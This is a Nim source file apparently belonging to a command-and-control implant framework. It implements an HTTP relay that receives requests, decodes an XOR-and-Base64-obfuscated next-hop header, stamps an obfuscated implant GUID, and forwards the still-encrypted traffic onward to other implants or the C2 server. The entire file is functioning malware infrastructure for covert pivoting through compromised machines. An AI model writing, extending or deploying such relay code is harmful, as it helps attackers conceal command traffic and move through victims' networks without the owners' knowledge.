#[
    Simple HTTP Relay - Pure HTTP Forwarding
    Relays HTTP requests transparently without decryption
    Only the C2 and final agent share encryption keys
]#

import net, nativesockets, strutils, times, base64
import ../util/crypto
import ../config/configParser

const
    RELAY_BUFFER_SIZE = 8192  # 8KB buffer for reading
    RELAY_TIMEOUT = 30000     # 30 seconds timeout

type
    HttpRelayServer* = object
        socket*: Socket
        port*: int
        isListening*: bool
    
    HttpRequest = object
        `method`*: string
        path*: string
        headers*: seq[(string, string)]
        body*: string

# Parse X-Next-Hop header (encrypted with INITIAL_XOR_KEY)
proc decryptNextHop*(encrypted: string): string =
    try:
        # Base64 decode
        let decoded = base64.decode(encrypted)
        # XOR decrypt with INITIAL_XOR_KEY
        result = xorString(decoded, INITIAL_XOR_KEY)
        when defined debug:
            echo "[RELAY] 🔓 Decrypted X-Next-Hop: " & result
    except:
        when defined debug:
            echo "[RELAY] ❌ Failed to decrypt X-Next-Hop"
        result = ""

# Parse HTTP request from raw data
proc parseHttpRequest(data: string): HttpRequest =
    var lines = data.split("\r\n")
    if lines.len == 0:
        return
    
    # Parse request line (e.g., "POST /task HTTP/1.1")
    let requestLine = lines[0].split(" ")
    if requestLine.len >= 2:
        result.`method` = requestLine[0]
        result.path = requestLine[1]
    
    # Parse headers
    var i = 1
    while i < lines.len and lines[i] != "":
        let headerLine = lines[i]
        let colonPos = headerLine.find(":")
        if colonPos > 0:
            let key = headerLine[0..<colonPos].strip()
            let value = headerLine[colonPos+1..^1].strip()
            result.headers.add((key, value))
        i.inc
    
    # Parse body (everything after blank line)
    i.inc  # Skip blank line
    if i < lines.len:
        result.body = lines[i..^1].join("\r\n")

# Encrypt relay GUID for X-Relay-GUID header (XOR + Base64)
proc encryptRelayGuid(guid: string): string =
    # XOR with INITIAL_XOR_KEY (same key used for INITIAL communication)
    let xored = xorString(guid, INITIAL_XOR_KEY)
    result = base64.encode(xored)
    when defined debug:
        echo "[RELAY] 🔐 Encrypted relay GUID: " & guid & " -> " & result

# Forward HTTP request to next hop
proc forwardRequest(nextHop: string, req: HttpRequest, relayGuid: string = ""): string =
    when defined debug:
        echo "[RELAY] 🔀 Forwarding to: " & nextHop
        echo "[RELAY] 🔀 Method: " & req.`method` & " Path: " & req.path
    
    try:
        # Parse next hop (format: "host:port")
        let parts = nextHop.split(":")
        if parts.len != 2:
            when defined debug:
                echo "[RELAY] ❌ Invalid next hop format: " & nextHop
            return ""
        
        let host = parts[0]
        let port = parseInt(parts[1])
        
        # Create socket and connect
        var client = newSocket()
        client.setSockOpt(OptReuseAddr, true)
        client.connect(host, Port(port))
        
        # Build HTTP request
        var request = req.`method` & " " & req.path & " HTTP/1.1\r\n"
        
        # Add original headers (skip X-Relay-GUID to avoid duplicates in multi-hop)
        for (key, value) in req.headers:
            if key.toLower() != "x-relay-guid":
                request.add(key & ": " & value & "\r\n")
            else:
                when defined debug:
                    echo "[RELAY] 🗑️ Removed existing X-Relay-GUID header (multi-hop cleanup)"
        
        # Inject THIS relay's GUID (replacing any previous one)
        if relayGuid != "":
            let encryptedGuid = encryptRelayGuid(relayGuid)
            request.add("X-Relay-GUID: " & encryptedGuid & "\r\n")
            when defined debug:
                echo "[RELAY] 🏷️ Injected X-Relay-GUID: " & relayGuid
        
        # Add blank line and body
        request.add("\r\n")
        if req.body != "":
            request.add(req.body)
        
        # Send request
        client.send(request)
        
        when defined debug:
            echo "[RELAY] 📤 Sent request to " & nextHop
        
        # Read response
        var response = ""
        var buffer = newString(RELAY_BUFFER_SIZE)
        while true:
            let bytesRead = client.recv(buffer, RELAY_BUFFER_SIZE)
            if bytesRead <= 0:
                break
            response.add(buffer[0..<bytesRead])
            
            # Check if we've received the complete response
            # (Simple heuristic: if we have Content-Length, check if we've read enough)
            if "Content-Length:" in response:
                # Parse content length and check if body is complete
                # This is simplified - production code would be more robust
                break
        
        client.close()
        
        when defined debug:
            echo "[RELAY] 📥 Received response (" & $response.len & " bytes)"
        
        return response
        
    except:
        when defined debug:
            echo "[RELAY] ❌ Forward failed: " & getCurrentExceptionMsg()
        return ""

# Handle incoming connection
proc handleRelayConnection(client: Socket, relayGuid: string = "") =
    when defined debug:
        echo "[RELAY] 🔌 New connection"
    
    try:
        # Read request
        var requestData = ""
        var buffer = newString(RELAY_BUFFER_SIZE)
        
        while true:
            let bytesRead = client.recv(buffer, RELAY_BUFFER_SIZE)
            if bytesRead <= 0:
                break
            requestData.add(buffer[0..<bytesRead])
            
            # Check if we've received the complete request
            if "\r\n\r\n" in requestData:
                # We have headers, check if there's a body
                if "Content-Length:" in requestData:
                    # Parse content length (simplified)
                    let lines = requestData.split("\r\n")
                    var contentLength = 0
                    for line in lines:
                        if line.toLower().startsWith("content-length:"):
                            let value = line.split(":")[1].strip()
                            contentLength = parseInt(value)
                            break
                    
                    # Check if we have the complete body
                    let headerEnd = requestData.find("\r\n\r\n")
                    let bodySize = requestData.len - headerEnd - 4
                    if bodySize >= contentLength:
                        break
                else:
                    break  # No body expected
        
        # Parse request
        let req = parseHttpRequest(requestData)
        
        # Extract X-Next-Hop header
        var nextHop = ""
        for (key, value) in req.headers:
            if key.toLower() == "x-next-hop":
                nextHop = decryptNextHop(value)
                break
        
        if nextHop == "":
            when defined debug:
                echo "[RELAY] ❌ No X-Next-Hop header found"
            let response = "HTTP/1.1 400 Bad Request\r\nContent-Length: 0\r\n\r\n"
            client.send(response)
            client.close()
            return
        
        # Forward request with relay GUID
        let response = forwardRequest(nextHop, req, relayGuid)
        
        if response != "":
            client.send(response)
        else:
            let errorResponse = "HTTP/1.1 502 Bad Gateway\r\nContent-Length: 0\r\n\r\n"
            client.send(errorResponse)
        
        client.close()
        
    except:
        when defined debug:
            echo "[RELAY] ❌ Connection error: " & getCurrentExceptionMsg()
        try:
            client.close()
        except:
            discard

# Start HTTP relay server with implant GUID
# The relayGuid should be the actual implant GUID from the listener
proc startHttpRelayServer*(port: int, implantGuid: string = ""): HttpRelayServer =
    when defined debug:
        echo "[RELAY] 🚀 Starting HTTP relay server on port " & $port
    
    result.port = port
    result.isListening = false
    
    try:
        result.socket = newSocket()
        result.socket.setSockOpt(OptReuseAddr, true)
        result.socket.bindAddr(Port(port))
        result.socket.listen()
        result.isListening = true
        
        echo "[RELAY] ✅ HTTP relay server started on port " & $port
        
        # Use provided implant GUID or placeholder
        var relayGuid = implantGuid
        if relayGuid == "":
            when defined debug:
                echo "[RELAY] ⚠️ WARNING: No implant GUID provided, using placeholder"
            relayGuid = "RELAY-UNREGISTERED"
        
        when defined debug:
            echo "[RELAY] 🆔 Using implant GUID: " & relayGuid
        
        # Accept connections loop
        while true:
            var client: Socket
            new(client)
            result.socket.accept(client)
            
            # Handle in separate thread/async (for now, synchronous)
            handleRelayConnection(client, relayGuid)
            
    except:
        echo "[RELAY] ❌ Failed to start relay server: " & getCurrentExceptionMsg()
        result.isListening = false
